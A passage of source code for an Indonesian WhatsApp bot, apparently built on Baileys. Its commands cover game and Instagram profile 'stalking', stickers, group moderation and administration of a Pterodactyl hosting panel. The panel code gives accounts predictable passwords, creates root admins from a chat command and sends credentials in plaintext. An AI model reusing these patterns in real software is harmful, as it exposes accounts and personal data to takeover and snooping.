𝗧𝗥𝗔𝗡𝗦𝗔𝗞𝗦𝗜 𝗣𝗘𝗡𝗗𝗜𝗡𝗚
𝗛𝗔𝗥𝗔𝗣 𝗕𝗘𝗥𝗦𝗔𝗕𝗔𝗥`
reply(text_trxpending)
break

case 'stalker': case 'stalk': {
if (!text) return reply(`Example : ${prefix +command} type id\n\nList Type :\n1. ff (Free Fire)\n2. ml (Mobile Legends)\n3. aov (Arena Of Valor)\n4. cod (Call Of Duty)\n5. pb (point Blank)\n6. ig (Instagram)\n7. npm (https://npmjs.com)`)
let [type, id, zone] = args
if (type.toLowerCase() == 'ff') {
if (!id) throw `No Query id, Example ${prefix + command} ff 552992060`
let anu = await fetchJson(`https://api.zahwazein.xyz/stalker/nickff?apikey=${zenzkey}&query=${id}`)
if (anu.status == false) return m.reply(anu.result.message)
m.reply(`ID : ${anu.result.gameId}\nUsername : ${anu.result.userName}`)
} else if (type.toLowerCase() == 'ml') {
if (!id) throw `No Query id, Example : ${prefix + command} ml 214885010 2253`
if (!zone) throw `No Query id, Example : ${prefix + command} ml 214885010 2253`
let anu = await fetchJson(`https://api.zahwazein.xyz/stalker/nickml?apikey=${zenzkey}&query=${id}&query2=${zone}`)
if (anu.status == false) return m.reply(anu.result.message)
m.reply(`ID : ${anu.result.gameId}\nZone : ${anu.result.zoneId}\nUsername : ${anu.result.userName}`)
} else if (type.toLowerCase() == 'aov') {
if (!id) throw `No Query id, Example ${prefix + command} aov 293306941441181`
let anu = await fetchJson(`https://api.zahwazein.xyz/stalker/nickaov?apikey=${zenzkey}&query=${id}`)
if (anu.status == false) return m.reply(anu.result.message)
m.reply(`ID : ${anu.result.gameId}\nUsername : ${anu.result.userName}`)
} else if (type.toLowerCase() == 'cod') {
if (!id) throw `No Query id, Example ${prefix + command} cod 6290150021186841472`
let anu = await fetchJson(`https://api.zahwazein.xyz/stalker/nickcod?apikey=${zenzkey}&query=${id}`)
if (anu.status == false) return m.reply(anu.result.message)
m.reply(`ID : ${anu.result.gameId}\nUsername : ${anu.result.userName}`)
} else if (type.toLowerCase() == 'pb') {
if (!id) throw `No Query id, Example ${prefix + command} pb riio46`
let anu = await fetchJson(`https://api.zahwazein.xyz/stalker/nickpb?apikey=${zenzkey}&query=${id}`)
if (anu.status == false) return m.reply(anu.result.message)
m.reply(`ID : ${anu.result.gameId}\nUsername : ${anu.result.userName}`)
} else if (type.toLowerCase() == 'npm') {
if (!id) throw `No Query username, Example : ${prefix + command} npm scrape-primbon`
let { result: anu } = await fetchJson(`https://api.zahwazein.xyz/stalker/npm?query=${id}&apikey=${zenzkey}`)
if (anu.status == false) return m.reply(anu.result.message)
m.reply(`⭔ Name : ${anu.name}\n⭔ Version : ${Object.keys(anu.versions)}\n⭔ Created : ${tanggal(anu.time.created)}\n⭔ Modified : ${tanggal(anu.time.modified)}\n⭔ Maintainers :\n ${anu.maintainers.map(v => `- ${v.name} : ${v.email}`).join('\n')}\n\n⭔ Description : ${anu.description}\n⭔ Homepage : ${anu.homepage}\n⭔ Keywords : ${anu.keywords}\n⭔ Author : ${anu.author.name}\n⭔ License : ${anu.license}\n⭔ Readme : ${anu.readme}`)
} else {
m.reply(`Example : ${prefix +command} type id\n\nList Type :\n1. ff (Free Fire)\n2. ml (Mobile Legends)\n3. aov (Arena Of Valor)\n4. cod (Call Of Duty)\n5. pb (point Blank)\n6. ig (Instagram)\n7. npm (https://npmjs.com)`)
}
}
break
case "igstalk":{
if (!text) return m.reply(`Contoh ${prefix+command} Hyuu`)
let hsk = await ZassTdr.sendMessage(m.chat, { text: "Wait Kak Lagi Proses Mohon Tunggu" }, { quoted: m })
let aj = await igstalk(text)
ZassTdr.sendMessage(m.chat, { text: 
`*/ Stalking Instagram \\*

Fullname : ${aj.fullname}
Username : ${aj.username}
Post : ${aj.post}
Followers : ${aj.followers}
Following : ${aj.following}
Bio : ${aj.bio}` }, { quoted: hsk } )
}
break

case 'anticall': {
if (!isCreator) throw mess.owner
let ciko = global.db.data.settings[botNumber].anticall
if (args[0] === "on") {
if (ciko) return m.reply(`Sudah Aktif Sebelumnya`)
ciko = true
m.reply(`AntiCall Aktif !`)
} else if (args[0] === "off") {
if (!ciko) return m.reply(`Sudah Tidak Aktif Sebelumnya`)
ciko = false
m.reply(`AntiCall Tidak Aktif !`)
} else {
ZassTdr.sendPoll(m.chat, "Silahkan Dipilih, I Hope Your Happy!", [`${command.charAt(0).toUpperCase()+command.slice(1)} On`,`${command.charAt(0).toUpperCase()+command.slice(1)} Off`])
}
}
break


case 'tourl': {
m.reply(mess.wait)
let { UploadFileUgu, webp2mp4File, TelegraPh } = require('./lib/uploader')
let media = await ZassTdr.downloadAndSaveMediaMessage(qmsg)
if (/image/.test(mime)) {
let anu = await TelegraPh(media)
m.reply(util.format(anu))
} else if (!/image/.test(mime)) {
let anu = await UploadFileUgu(media)
m.reply(util.format(anu))
}
await fs.unlinkSync(media)
}
break
case 'toimage': case 'toimg': {
if (!/webp/.test(mime)) throw `Reply sticker dengan caption *${prefix + command}*`
m.reply(mess.wait)
let media = await ZassTdr.downloadAndSaveMediaMessage(qmsg)
let ran = await getRandom('.png')
exec(`ffmpeg -i ${media} ${ran}`, (err) => {
fs.unlinkSync(media)
if (err) throw err
let buffer = fs.readFileSync(ran)
ZassTdr.sendMessage(m.chat, { image: buffer }, { quoted: m })
fs.unlinkSync(ran)
})
}
break
case 'sticker': case 's': case 'stickergif': case 'sgif': {
if (/image/.test(mime)) {
m.reply(mess.wait)
let media = await ZassTdr.downloadMediaMessage(qmsg)
let encmedia = await ZassTdr.sendImageAsSticker(m.chat, media, m, { packname: global.packname, author: global.author })
await fs.unlinkSync(encmedia)
} else if (/video/.test(mime)) {
m.reply(mess.wait)
if (qmsg.seconds > 11) return m.reply('Maksimal 10 detik!')
let media = await ZassTdr.downloadMediaMessage(qmsg)
let encmedia = await ZassTdr.sendVideoAsSticker(m.chat, media, m, { packname: global.packname, author: global.author })
await fs.unlinkSync(encmedia)
} else {
m.reply(`Kirim/reply gambar/video/gif dengan caption ${prefix + command}\nDurasi Video/Gif 1-9 Detik`)
}
}
break
case 'stickerwm': case 'swm': case 'stickergifwm': case 'sgifwm': {
let [teks1, teks2] = text.split`|`
if (!teks1) throw `Kirim/reply image/video dengan caption ${prefix + command} teks1|teks2`
if (!teks2) throw `Kirim/reply image/video dengan caption ${prefix + command} teks1|teks2`
m.reply(mess.wait)
if (/image/.test(mime)) {
let media = await ZassTdr.downloadMediaMessage(qmsg)
let encmedia = await ZassTdr.sendImageAsSticker(m.chat, media, m, { packname: teks1, author: teks2 })
await fs.unlinkSync(encmedia)
} else if (/video/.test(mime)) {
if ((quoted.msg || quoted).seconds > 11) return m.reply('Maksimal 10 detik!')
let media = await ZassTdr.downloadMediaMessage(qmsg)
let encmedia = await ZassTdr.sendVideoAsSticker(m.chat, media, m, { packname: teks1, author: teks2 })
await fs.unlinkSync(encmedia)
} else {
throw `Kirim Gambar/Video Dengan Caption ${prefix + command}\nDurasi Video 1-9 Detik`
}
}
break
case 'smeme': case 'stickermeme': case 'stickmeme': {
  let respond = `Kirim/reply image/sticker dengan caption ${prefix + command} text1|text2`
  if (!/image/.test(mime)) throw respond
  if (!text) throw respond
  reply(`Proses...`)
  let atas = text.split('|')[0] ? text.split('|')[0] : '-'
  let bawah = text.split('|')[1] ? text.split('|')[1] : '-'
  let { TelegraPh } = require('./ZassTdrjs/lib/uploader')
  try {
  let mee = await ZassTdr.downloadAndSaveMediaMessage(quoted)
  let mem = await TelegraPh(mee)
  let smeme = `https://api.memegen.link/images/custom/${encodeURIComponent(atas)}/${encodeURIComponent(bawah)}.png?background=${mem}`
  let awikwok = await ZassTdr.sendImageAsSticker(m.chat, smeme, m, { packname: global.packname, author: global.author })
  await fs.unlinkSync(awikwok)
  } catch (e) {
  reply(`Sistem Sedang Error`)
  }
  }
  break       
// GROUP
case 'lgc': case 'linkgc': {
if (!m.isGroup) throw mess.group
if (!isBotAdmins) throw mess.botAdmin
let response = await ZassTdr.groupInviteCode(m.chat)
ZassTdr.sendText(m.chat, `https://chat.whatsapp.com/${response}\n\nLink Group : ${groupMetadata.subject}`, m, { detectLink: true })
}
break
case 'setname': case 'setsubject': {
if (!m.isGroup) throw mess.group
if (!isBotAdmins) throw mess.botAdmin
if (!isAdmins) throw mess.admin
if (!text) throw 'Text ?'
await ZassTdr.groupUpdateSubject(m.chat, text).then((res) => m.reply(mess.success)).catch((err) => m.reply(jsonformat(err)))
}
break
case 'setdeskgc': case 'setdesk': {
if (!m.isGroup) throw mess.group
if (!isBotAdmins) throw mess.botAdmin
if (!isAdmins) throw mess.admin
if (!text) throw 'Text ?'
await ZassTdr.groupUpdateDescription(m.chat, text).then((res) => m.reply(mess.success)).catch((err) => m.reply(jsonformat(err)))
}
break
case 'setppgroup': case 'setppgrup': case 'setppgc': {
if (!m.isGroup) throw mess.group
if (!isAdmins) throw mess.admin
if (!/image/.test(mime)) throw `Kirim/Reply Image Dengan Caption ${prefix + command}`
if (/webp/.test(mime)) throw `Kirim/Reply Image Dengan Caption ${prefix + command}`
let media = await ZassTdr.downloadAndSaveMediaMessage(qmsg)
await ZassTdr.updateProfilePicture(m.chat, { url: media }).catch((err) => fs.unlinkSync(media))
m.reply(mess.success)
}
break
case 'resetlink': case 'rl': 
if (!isCreator) return m.reply('Jirr Lu Siapa Cok')
if (!isBotAdmins) return m.reply('Bot Bukan Admin Cuy')
if (!m.isGroup) return m.reply('Buat Di Group Bodoh')
await ZassTdr.groupRevokeInvite(from)
.then( res => {
m.reply(`Link Gc Nya Udh Gw Reset Bang`)
})
break
case 'k': case 'kick': {
if (!m.isGroup) throw mess.group
if (!isBotAdmins) throw mess.botAdmin
if (!isAdmins) throw mess.admin
let users = m.mentionedJid[0] ? m.mentionedJid : m.quoted ? [m.quoted.sender] : [text.replace(/[^0-9]/g, '')+'@s.whatsapp.net']
await ZassTdr.groupParticipantsUpdate(m.chat, users, 'remove').then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
}
break
case 'add': {
if (!m.isGroup) throw mess.group
if (!isBotAdmins) throw mess.botAdmin
if (!isAdmins) throw mess.admin
let users = m.mentionedJid[0] ? m.mentionedJid : m.quoted ? [m.quoted.sender] : [text.replace(/[^0-9]/g, '')+'@s.whatsapp.net']
await ZassTdr.groupParticipantsUpdate(m.chat, users, 'add').then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
}
break
case 'promote': {
if (!m.isGroup) throw mess.group
if (!isBotAdmins) throw mess.botAdmin
if (!isAdmins) throw mess.admin
let users = m.mentionedJid[0] ? m.mentionedJid : m.quoted ? [m.quoted.sender] : [text.replace(/[^0-9]/g, '')+'@s.whatsapp.net']
await ZassTdr.groupParticipantsUpdate(m.chat, users, 'promote').then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
}
break
case 'demote': {
if (!m.isGroup) throw mess.group
if (!isBotAdmins) throw mess.botAdmin
if (!isAdmins) throw mess.admin
let users = m.mentionedJid[0] ? m.mentionedJid : m.quoted ? [m.quoted.sender] : [text.replace(/[^0-9]/g, '')+'@s.whatsapp.net']
await ZassTdr.groupParticipantsUpdate(m.chat, users, 'demote').then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
}
break
case 'tagall': {
if (!m.isGroup) throw mess.group
if (!isBotAdmins) throw mess.botAdmin
if (!isAdmins) throw mess.admin
let teks = `══✪〘 *👥 Tag All* 〙✪══
 
 ➲ *Pesan : ${q ? q : 'kosong'}*\n\n`
for (let mem of participants) {
teks += `⭔ @${mem.id.split('@')[0]}\n`
}
ZassTdr.sendMessage(m.chat, { text: teks, mentions: participants.map(a => a.id) }, { quoted: m })
}
break
case 'ht': case 'hidetag': {
if (!m.isGroup) throw mess.group
if (!isBotAdmins) throw mess.botAdmin
if (!isAdmins) throw mess.admin
ZassTdr.sendMessage(m.chat, { text : q ? q : '' , mentions: participants.map(a => a.id)}, { quoted: m })
}
break
case 'totag': {
if (!m.isGroup) throw mess.group
if (!isBotAdmins) throw mess.botAdmin
if (!isAdmins) throw mess.admin
if (!m.quoted) throw `Reply pesan dengan caption ${prefix + command}`
ZassTdr.sendMessage(m.chat, { forward: m.quoted.fakeObj, mentions: participants.map(a => a.id) })
}
break
case 'gc': case 'grup': {
if (!m.isGroup) throw mess.group
if (!isBotAdmins) throw mess.botAdmin
if (!isAdmins) throw mess.admin
if (args[0] === 'close'){
await ZassTdr.groupSettingUpdate(m.chat, 'announcement').then((res) => m.reply(`Sukses Menutup Group`)).catch((err) => m.reply(jsonformat(err)))
} else if (args[0] === 'open'){
await ZassTdr.groupSettingUpdate(m.chat, 'not_announcement').then((res) => m.reply(`Sukses Membuka Group`)).catch((err) => m.reply(jsonformat(err)))
} else {
ZassTdr.sendPoll(m.chat, "Silahkan Dipilih, I Hope Your Happy!", [`${command.charAt(0).toUpperCase()+command.slice(1)} Open`,`${command.charAt(0).toUpperCase()+command.slice(1)} Close`])
}
}
break
case 'editinfo': {
if (!m.isGroup) throw mess.group
if (!isBotAdmins) throw mess.botAdmin
if (!isAdmins) throw mess.admin
if (args[0] === 'open'){
await ZassTdr.groupSettingUpdate(m.chat, 'unlocked').then((res) => m.reply(`Sukses Membuka Edit Info Group`)).catch((err) => m.reply(jsonformat(err)))
} else if (args[0] === 'close'){
await ZassTdr.groupSettingUpdate(m.chat, 'locked').then((res) => m.reply(`Sukses Menutup Edit Info Group`)).catch((err) => m.reply(jsonformat(err)))
} else {
ZassTdr.sendPoll(m.chat, "Silahkan Dipilih, I Hope Your Happy!", [`${command.charAt(0).toUpperCase()+command.slice(1)} Open`,`${command.charAt(0).toUpperCase()+command.slice(1)} Close`])
}
}
break         
case 'autojpm': {
if (!isCreator) return m.reply(`*khusus Premium*`)
if (!m.isGroup) return reply('khusus frup') 
if (args.length < 1) return m.reply('ketik on untuk mengaktifkan\nketik off untuk menonaktifkan')
if (args[0] === "on") {
if (Jpm) return m.reply('Sudah Aktif')
ntilink.push(from)
m.reply('Succes menyalakan jpm di group ini 🌷')
} else if (args[0] === "off") {
if (!Jpm) return m.reply('Sudah Mati')
let off = ntilink.indexOf(from)
ntilink.splice(off, 1)
m.reply('Succes mematikan jpm di group ini 🌷')
} else {
m.reply('on untuk mengaktifkan, off untuk menonaktifkan')
}
}
break
case 'welcome':{
if (!m.isGroup) throw mess.group
if (!isBotAdmins) throw mess.botAdmin
if (!isAdmins) throw mess.admin
if (!q) return m.reply(`Pilih on atau off`)
if (args[0] === "on") {
if (isWelcome) return m.reply(`Welcome sudah aktif`)
welcome.push(m.chat)
fs.writeFileSync('./ZassTdrjs/database/welcome.json', JSON.stringify(welcome, null, 2))
m.reply(`Sukses mengaktifkan welcome di grup ini`)
} else if (args[0] === "off") {
if (!isWelcome) return m.reply(`Welcome sudah nonaktif`)
var posi = welcome.indexOf(m.chat)
welcome.splice(posi, 1)
fs.writeFileSync('./ZassTdrjs/database/welcome.json', JSON.stringify(welcome, null, 2))
m.reply(`Sukses menonaktifkan welcome di grup ini`)
} else {
m.reply(`Pilih on atau off`)
}
}
break
case 'antilink': {
if (!isCreator) return m.reply(`*khusus Premium*`)
if (!m.isGroup) return groupon(from)
if (!isAdmins && !isCreator) return sticAdmin(from)
await loading()
if (args.length < 1) return m.reply('ketik on untuk mengaktifkan\nketik off untuk menonaktifkan')
if (args[0] === "on") {
if (AntiLink) return m.reply('Sudah Aktif')
ntilink.push(from)
m.reply('Succes menyalakan antilink di group ini 🌷')
} else if (args[0] === "off") {
if (!AntiLink) return m.reply('Sudah Mati')
let off = ntilink.indexOf(from)
ntilink.splice(off, 1)
m.reply('Succes mematikan antilink di group ini 🌷')
} else {
m.reply('on untuk mengaktifkan, off untuk menonaktifkan')
}
}
break
case 'mute': {
if (!m.isGroup) throw mess.group
if (!isBotAdmins) throw mess.botAdmin
if (!isAdmins) throw mess.admin
if (args[0] === "on") {
if (global.db.data.chats[m.chat].mute) return m.reply(`Sudah Aktif Sebelumnya`)
global.db.data.chats[m.chat].mute = true
m.reply(`${ZassTdr.user.name} telah di mute di group ini !`)
} else if (args[0] === "off") {
if (!global.db.data.chats[m.chat].mute) return m.reply(`Sudah Tidak Aktif Sebelumnya`)
global.db.data.chats[m.chat].mute = false
m.reply(`${ZassTdr.user.name} telah di unmute di group ini !`)
} else {
ZassTdr.sendPoll(m.chat, "Silahkan Dipilih, I Hope Your Happy!", [`${command.charAt(0).toUpperCase()+command.slice(1)} On`,`${command.charAt(0).toUpperCase()+command.slice(1)} Off`])
}
}
break
// cpanel
case "createadmin": {
if (!isCreator) return reply(`Jirr Lu Siapa Cukk`)
let s = q.split(',')
let email = s[0];
let username = s[0]
let nomor = s[1]
if (s.length < 2) return reply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
if (!username) return reply(`Ex : ${prefix+command} Username,@tag/nomor\n\nContoh :\n${prefix+command} example,@user`)
if (!nomor) return reply(`Ex : ${prefix+command} Username,@tag/nomor\n\nContoh :\n${prefix+command} example,@user`)
let password = username + "019"
let nomornya = nomor.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": username + "@gmail.com",
"username": username,
"first_name": username,
"last_name": "Memb",
"language": "en",
 "root_admin" : true,  
"password": password.toString()
})

})

let data = await f.json();

if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));

let user = data.attributes

let tks = `
TYPE: user

📡ID: ${user.id}
🌷UUID: ${user.uuid}
👤USERNAME: ${user.username}
📬EMAIL: ${user.email}
🦖NAME: ${user.first_name} ${user.last_name}
🔥LANGUAGE: ${user.language}
📊ADMIN: ${user.root_admin}
☢️CREATED AT: ${user.created_at}

🖥️LOGIN: ${domain}
`
    const listMessage = {

        text: tks,

    }

	

    await ZassTdr.sendMessage(m.chat, listMessage)

    await ZassTdr.sendMessage(nomornya, {

        text: `*BERIKUT DETAIL AKUN ADMIN  PANEL ANDA*\n

USERNAME :  ${username}
PASSWORD: ${password}
LOGIN: ${domain}

*NOTE : OWNER HANYA MENGIRIM 1X DATA AKUN ANDA MOHON DI SIMPAN BAIK BAIK KALAU DATA AKUN ANDA HILANG OWNER TIDAK DAPAT MENGIRIM AKUN ANDA LAGI*


`,

    })

} 
        break
case "listadmin": {
  if (!isCreator) return reply(`Maaf, Anda tidak dapat melihat daftar pengguna.`);
  let page = args[0] ? args[0] : '1';
  let f = await fetch(domain + "/api/application/users?page=" + page, {
    "method": "GET",
    "headers": {
      "Accept": "application/json",
      "Content-Type": "application/json",
      "Authorization": "Bearer " + apikey
    }
  });
  let res = await f.json();
  let users = res.data;
  let messageText = "Berikut list admin:\n\n";

  for (let user of users) {
    let u = user.attributes;
    if (u.root_admin) {
      messageText += `ID: ${u.id} - Status: ${u.attributes?.user?.server_limit === null ? 'Inactive' : 'Active'}\n`;
      messageText += `${u.username}\n`;
      messageText += `${u.first_name} ${u.last_name}\n\n`;
    }
  }

  messageText += `Page: ${res.meta.pagination.current_page}/${res.meta.pagination.total_pages}\n`;
  messageText += `Total Admin: ${res.meta.pagination.count}`;

  await ZassTdr.sendMessage(m.chat, { text: messageText }, { quoted: m });

  if (res.meta.pagination.current_page < res.meta.pagination.total_pages) {
    reply(`Gunakan perintah ${prefix}listusr ${res.meta.pagination.current_page + 1} untuk melihat halaman selanjutnya.`);
  }
}
break
case "listsrv": {
  if (!isSeler) return reply(`Maaf, Anda tidak dapat melihat daftar server.`);
  let page = args[0] ? args[0] : '1';
  let f = await fetch(domain + "/api/application/servers?page=" + page, {
    "method": "GET",
    "headers": {
      "Accept": "application/json",
      "Content-Type": "application/json",
      "Authorization": "Bearer " + apikey
    }
  });
  let res = await f.json();
  let servers = res.data;
  let sections = [];
  let messageText = "Berikut adalah daftar server:\n\n";
  
  for (let server of servers) {
    let s = server.attributes;
    
    let f3 = await fetch(domain + "/api/client/servers/" + s.uuid.split`-`[0] + "/resources", {
      "method": "GET",
      "headers": {
        "Accept": "application/json",
        "Content-Type": "application/json",
        "Authorization": "Bearer " + capikey
      }
    });
    
    let data = await f3.json();
    let status = data.attributes ? data.attributes.current_state : s.status;
    
    messageText += `ID Server: ${s.id}\n`;
    messageText += `Nama Server: ${s.name}\n`;
    messageText += `Status: ${status}\n\n`;
  }
  
  messageText += `Halaman: ${res.meta.pagination.current_page}/${res.meta.pagination.total_pages}\n`;
  messageText += `Total Server: ${res.meta.pagination.count}`;
  
  await ZassTdr.sendMessage(m.chat, { text: messageText }, { quoted: m });
  
  if (res.meta.pagination.current_page < res.meta.pagination.total_pages) {
    reply(`Gunakan perintah ${prefix}listsrv ${res.meta.pagination.current_page + 1} untuk melihat halaman selanjutnya.`);
  }
}
break
              case "listusr": {
  if (!isSeler) return reply('males')
  let page = args[0] ? args[0] : '1';
  let f = await fetch(domain + "/api/application/users?page=" + page, {
    "method": "GET",
    "headers": {
      "Accept": "application/json",
      "Content-Type": "application/json",
      "Authorization": "Bearer " + apikey
    }
  });
  let res = await f.json();
  let users = res.data;
  let messageText = "Berikut list user:\n\n";
  
  for (let user of users) {
    let u = user.attributes;
    messageText += `ID: ${u.id} - Status: ${u.attributes?.user?.server_limit === null ? 'Inactive' : 'Active'}\n`;
    messageText += `${u.username}\n`;
    messageText += `${u.first_name} ${u.last_name}\n\n`;
  }
  
  messageText += `Page: ${res.meta.pagination.current_page}/${res.meta.pagination.total_pages}\n`;
  messageText += `Total Users: ${res.meta.pagination.count}`;
  
  await ZassTdr.sendMessage(m.chat, { text: messageText }, { quoted: m });
  
  if (res.meta.pagination.current_page < res.meta.pagination.total_pages) {
    reply(`Gunakan perintah ${prefix}listusr ${res.meta.pagination.current_page + 1} untuk melihat halaman selanjutnya.`);
  }
}
break
        case "delsrv": {
      if (!isCreator) return reply(`Jirr Lu Siapa Cok`)

let srv = args[0]
if (!srv) return reply('ID nya mana?')
let f = await fetch(domain + "/api/application/servers/" + srv, {
"method": "DELETE",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
}
})
let res = f.ok ? {
errors: null
} : await f.json()
if (res.errors) return reply('*SERVER NOT FOUND*')
reply('*SUCCESSFULLY DELETE THE SERVER*')
}
        break
        case "delusr": {
  if (!isCreator) return reply(`Jirr Lu Siapa Cok`)
let usr = args[0]
if (!usr) return reply('ID nya mana?')
let f = await fetch(domain + "/api/application/users/" + usr, {
"method": "DELETE",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let res = f.ok ? {
errors: null
} : await f.json()
if (res.errors) return reply('*USER NOT FOUND*')
reply('*SUCCESSFULLY DELETE THE USER*')
}
        break
                case "addusr": {
if (!isSeler) return reply(`Maaf Command Tersebut Khusus Developer Bot WhatsApp`)
let t = text.split(',');
if (t.length < 3) return reply(`*Format salah!*

Penggunaan:
${prefix + command} email,username,name,number/tag`);
let email = t[0];
let username = t[1];
let name = t[2];
let u = m.quoted ? m.quoted.sender : t[3] ? t[3].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
if (!u) return m.reply(`*Format salah!*

Penggunaan:
${prefix + command} email,username,name,number/tag`);
let d = (await ZassTdr.onWhatsApp(u.split`@`[0]))[0] || {}
let password = d.exists ? crypto.randomBytes(5).toString('hex') : t[3]
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": name,
"last_name": "Memb",
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let p = await ZassTdr.sendMessage(m.chat, { text: `
*SUCCESSFULLY ADD USER*

╭─❏ *『 USER INFO 』*
┣❐ ➤ *ID* : ${user.id}
┣❏ ➤ *USERNAME* : ${user.username}
┣❏ ➤ *EMAIL* : ${user.email}
┣❏ ➤ *NAME* : ${user.first_name} ${user.last_name}
┣❏ ➤ *CREATED AT* :  ${tanggal}
┗⬣ *PASSWORD BERHASIL DI KIRIM KE @${u.split`@`[0]}*`, mentions:[u],
})
ZassTdr.sendMessage(u, { text: `*BERIKUT DETAIL AKUN PANEL ANDA*\n
╭─❏ *『 USER INFO 』*
┣❏ ➤ *📧EMAIL* : ${email}
┣❏ ➤ *👤USERNAME* : ${username}
┣❏ ➤ *🔐PASSWORD* : ${password.toString()}
┣❏ ➤ *🌐LOGIN* : ${domain}
┗⬣`,
})
}
break
case "addsrv": {
if (!isSeler) return reply(`Jirr Lu Siapa Cok`)
let s = text.split(',');
if (s.length < 7) return reply(`*Format salah!*

Penggunaan:
${prefix + command} name,tanggal,userId,eggId,locationId,memory/disk,cpu`)
let name = s[0];
let desc = s[1] || ''
let usr_id = s[2];
let egg = s[3];
let loc = s[4];
let memo_disk = s[5].split`/`;
let cpu = s[6];
let f1 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let data = await f1.json();
let startup_cmd = data.attributes.startup

let f = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": desc,
"user": usr_id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo_disk[0],
"swap": 0,
"disk": memo_disk[1],
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 5
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f.json()
if (res.errors) return reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
reply(`*SUCCESSFULLY ADD SERVER*

TYPE: ${res.object}

ID: ${server.id}
UUID: ${server.uuid}
NAME: ${server.name}
DESCRIPTION: ${server.description}
MEMORY: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
DISK: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk} MB
CPU: ${server.limits.cpu}%
CREATED AT: ${server.created_at}`)
}
        break
case 'suspend': {
            if (!isCreator) return reply(`Sory Cik Lu Siapa Bjirr`)
            let srv = args[0]
            if (!srv) return reply('ID nya mana?')
            let f = await fetch(domain + "/api/application/servers/" + srv + "/suspend", {
                "method": "POST",
                "headers": {
                    "Accept": "application/json",
                    "Content-Type": "application/json",
                    "Authorization": "Bearer " + apikey
                }
            })
            let res = f.ok ? {
                errors: null
            } : await f.json()
            if (res.errors) return reply('*SERVER NOT FOUND*')
            reply('*BERHASIL SUSPEND..*')
        }
            break
            case 'unsuspend': {
            if (!isCreator) return reply(`Sory Cik Lu Siapa Bjirr`)
            let srv = args[0]
            if (!srv) return reply('ID nya mana?')
            let f = await fetch(domain + "/api/application/servers/" + srv + "/unsuspend", {
                "method": "POST",
                "headers": {
                    "Accept": "application/json",
                    "Content-Type": "application/json",
                    "Authorization": "Bearer " + apikey
                }
            })
            let res = f.ok ? {
                errors: null
            } : await f.json()
            if (res.errors) return reply('*SERVER NOT FOUND*')
           reply('*BERHASIL BUKA SUSPEND..*')
        }
            break
case "1gb": {
if (!isSeler) return reply(`maaf kamu tidak diizinkan untuk membuat panel saat ini`)
let t = text.split(',');
if (t.length < 2) return reply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username 
let egg = global.eggsnya
let loc = global.location
let memo = "1000"
let cpu = "30"
let disk = "1000"
let email = username + "1398@gmail.com"
akunlo = "https://telegra.ph/file/c488493756317874ed1b3.jpg" 
if (!u) return
let d = (await ZassTdr.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + "001"
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
reply(`PROSES ⚡`)
ctf = `Hai @${u.split`@`[0]}

 *👤USERNAME* : ${user.username}
 *🔐PASSWORD* : ${password}
 *🌐LOGIN* : ${domain}

NOTE :
OWNER HANYA MENGIRIM 1X DATA 
AKUN ANDA MOHON DI SIMPAN BAIK BAIK
KALAU DATA AKUN ANDA HILANG OWNER
TIDAK DAPAT MENGIRIM AKUN ANDA LAGI
`
ZassTdr.sendMessage(u,{image: {url: akunlo}, caption: ctf }, { quoted: ZassTdr.chat })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": " ",
"user": user.id,
"egg": parseInt(egg),
